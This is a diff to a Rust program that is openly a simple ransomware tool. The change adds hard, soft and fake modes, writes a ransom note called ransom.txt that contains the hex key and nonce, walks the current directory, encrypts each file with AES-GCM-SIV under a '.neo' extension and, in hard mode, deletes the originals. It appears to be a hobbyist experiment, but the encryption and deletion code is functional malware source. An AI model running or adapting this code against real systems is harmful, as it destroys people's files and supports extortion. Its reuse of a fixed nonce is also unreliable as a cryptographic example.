@@ -12,27 +12,23 @@ use aes_gcm_siv::{
 
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let mut input = String::new();
-    let mut hardcore = String::new();
+    let mut mode = String::new();
     let extension = "neo";
     
-    println!("It's encrypting time. 'y' to continue. Anything else to cancel.");
-    print!("Would you like to continue?: ");
+    println!("Select an encryption mode!");
+    println!("hard - (Delete original files).");
+    println!("soft - (Leave orginal files)");
+    println!("fake - (Iterate through directories and files. NO ENCRPTION)");
+    println!("Anything else to cancel.");
+    println!("Which mode would you like to set?: ");
+
     io::stdout().flush().unwrap(); //Have to flush to make the buffered write data actually output.
 
-    io::stdin().read_line(&mut input).expect("Failed to read line");
-    match input.trim() {
-        "y" => println!("Continuing On"),
-        _ => panic!("Awww. Nevermind. :'("),
-   }
-
-    println!("Would you like to enable hardcore mode (Delete original files). 'y' to continue. Anything else to not.");
-    print!("Would you like to be mean?: ");
-    io::stdout().flush().unwrap(); //Have to flush to make the buffered write data actually output.
-
-    io::stdin().read_line(&mut hardcore).expect("Failed to read line");
-    match hardcore.trim() {
-        "y" => println!("Hardcore On"),
+    io::stdin().read_line(&mut mode).expect("Failed to read line");
+    match mode.trim() {
+        "hard" => println!("Hardmode On | Deleteing Files"),
+        "soft" => println!("Softmode On | Not Deleteing Files"),
+        "fake" => println!("Fakemode On | Not Encrypting"),
         _ => println!("Being nice like a rabbit."),
    }
 
@@ -43,10 +39,15 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Generate a random 96-bit (12-byte) nonce
     let nonce = Nonce::from_slice(b"unique nonce");
 
-    //Walk the DIR and Encrypt Files
+    //Setup Directories
     let start_dir = env::current_dir()?;
     let current_exe = env::current_exe()?;
     
+    //Leave Ransomnote
+    let ransom_note_file = File::create(format!("{}\\ransom.txt",start_dir.display()));
+    let _ = ransom_note_file?.write_all(format!("Ransom Note: You've been hacked!\nKey:{}\nNonce:{}",hex::encode(key.as_slice()),hex::encode(nonce.as_slice())).as_bytes());
+
+    //Walk the DIR and Encrypt Files
     for entry in WalkDir::new(start_dir){
         println!();
         let entry = entry.unwrap();
@@ -59,6 +60,9 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         else if enc_target_path == current_exe {
             println!("Friendly Fire: NOT ENCRYPTING OURSELVES");
         }
+        else if mode.trim() == "fake"{
+            println!("FakeMode | Would Encrypt: {}",entry.path().display());
+        }
         else {
             println!("Encryping: {}", entry.path().display());
             
@@ -69,7 +73,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             let ciphertext = cipher.encrypt(nonce, plaintext.as_ref()).map_err(|e| format!("Encryption failed: {:?}", e))?;
             let output_file = File::create(Path::new(&format!("{}.{}",enc_target_path.display(),extension)));
             output_file?.write_all(&ciphertext)?;
-            if hardcore.trim() == "y" {
+            if mode.trim() == "hard" {
                 //Hardcore mode. Delete Original Files
                 println!("Deleteing: {}", enc_target_path.display());
                 fs::remove_file(enc_target_path)?;
@@ -87,8 +91,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     print!("Would you like to end program: ");
     io::stdout().flush().unwrap(); //Have to flush to make the buffered write data actually output.
 
-    io::stdin().read_line(&mut input).expect("Failed to read line");
-    match input.trim() {
+    io::stdin().read_line(&mut mode).expect("Failed to read line");
+    match mode.trim() {
         "y" => println!("Yup. Ending."),
         _ => panic!("Too bad. Ending."),
    }
